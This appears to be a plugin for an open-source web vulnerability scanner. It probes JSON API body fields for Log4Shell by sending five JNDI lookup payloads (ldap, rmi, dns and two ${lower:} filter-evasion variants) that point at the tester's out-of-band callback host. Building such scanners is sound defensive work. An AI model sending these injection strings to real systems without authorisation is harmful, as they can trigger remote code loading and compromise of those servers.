/* ---
id: log4shell-json-body-oob
name: Log4Shell JNDI Lookup via JSON Body Field (OOB)
description: Detects Log4Shell-style JNDI lookups when a JSON API body field is logged, sending per-variant lookup payloads with a unique out-of-band token and skipping honestly when no OOB server is configured.
author: GASH contributors
severity: critical
tags: [log4shell, jndi, injection, json, api, oob]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 40
phase: probe
order: 77
oob: required
api_version: "1.0"
tests: tests/fixtures/log4shell-json-body-oob/
oracle_params:
  namespace: log4shell-json
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/command-injection/log4shell-json-body-oob.js
// What: Tier 2 Log4Shell (JNDI) plugin for JSON request bodies.
// Why: The JNDI lookup family is a request-channel problem: the payload only
//   fires if the field reaches a vulnerable logger. Query-string and header
//   vectors are covered by the Tier 1 plugin; API bodies are the third
//   channel, and Tier 1 cannot rebuild a JSON object around a discovered
//   field. Every variant carries its own single-use token, so a callback names
//   the exact field and lookup form that caused it; without an OOB server the
//   plugin returns nothing instead of inventing a tentative finding.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const jsonContentType = "application/json";
  const maxSends = 40;
  const sent = [];

  // Lookup forms: plain ldap/rmi/dns plus the ${lower:} and ${env:} nesting
  // tricks that older filters miss. All of them point at the callback host.
  const builders = [
    function (o) { return "${jndi:ldap://" + o.domain + "/a}"; },
    function (o) { return "${jndi:rmi://" + o.domain + "/a}"; },
    function (o) { return "${jndi:dns://" + o.domain + "}"; },
    function (o) { return "${${lower:j}ndi:ldap://" + o.domain + "/b}"; },
    function (o) { return "${jndi:${lower:l}dap://" + o.domain + "/c}"; },
  ];

  for (const point of points) {
    if (sent.length >= maxSends) {
      break;
    }
    if (String(point.paramLocation || "").toLowerCase() !== "body") {
      continue;
    }
    if (!point.paramName) {
      continue;
    }
    const name = point.paramName;
    for (let i = 0; i < builders.length; i++) {
      if (sent.length >= maxSends) {
        break;
      }
      const oob = host.oob.generate("dns");
      if (!oob) {
        // No self-hosted server: the scheduler skips this plugin; returning an
        // empty set keeps the discipline even when it is forced to run.
        return [];
      }
      const payload = builders[i](oob);
      probe.send({
        url: point.url,
        method: point.method,
        paramName: "",
        paramLocation: "body",
        value: '{"' + name + '":"' + payload + '"}',
        headers: { "Content-Type": jsonContentType },
      });
      sent.push({ corr: oob.correlationId, ns: oob.namespace, point: point });
    }
  }
  if (sent.length === 0) {
    return [];
  }

  // ONE shared bounded window for the whole corpus: the token is unique per
  // field and variant, so the matched callback names its exact request.
  const ids = [];
  for (let i = 0; i < sent.length; i++) {
    ids.push(sent[i].corr);
  }
  const ev = host.oracles.oobAny(ids, sent[0].ns);
  if (!ev || ev.correlationId === undefined) {
    return [];
  }
  for (let i = 0; i < sent.length; i++) {
    if (sent[i].corr === String(ev.correlationId)) {
      return [host.candidate(sent[i].point, "oob", ev)];
    }
  }
  return [];
}
